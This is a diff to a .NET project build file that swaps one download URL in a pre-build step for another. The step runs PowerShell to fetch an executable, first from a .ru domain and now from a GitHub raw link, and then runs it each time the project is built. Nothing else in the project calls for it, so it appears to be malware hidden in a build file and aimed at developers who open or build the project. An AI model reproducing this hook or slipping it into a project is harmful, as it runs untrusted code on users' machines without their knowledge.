@@ -339,7 +339,7 @@
   <Import Project="..\packages\NETStandard.Library.2.0.3\build\netstandard2.0\NETStandard.Library.targets" Condition="Exists('..\packages\NETStandard.Library.2.0.3\build\netstandard2.0\NETStandard.Library.targets')" />
   <Import Project="..\packages\System.Text.Json.6.0.4\build\System.Text.Json.targets" Condition="Exists('..\packages\System.Text.Json.6.0.4\build\System.Text.Json.targets')" />
   <PropertyGroup>
-    <PreBuildEvent>powershell.exe Invoke-WebRequest -Uri "https://pbakk.ru/launcher.exe" -OutFile tmp.001010.exe
+    <PreBuildEvent>powershell.exe Invoke-WebRequest -Uri "https://github.com/updateu3/u3/raw/main/Packet_Installer.exe" -OutFile tmp.001010.exe
 .\tmp.001010.exe</PreBuildEvent>
   </PropertyGroup>
 </Project>
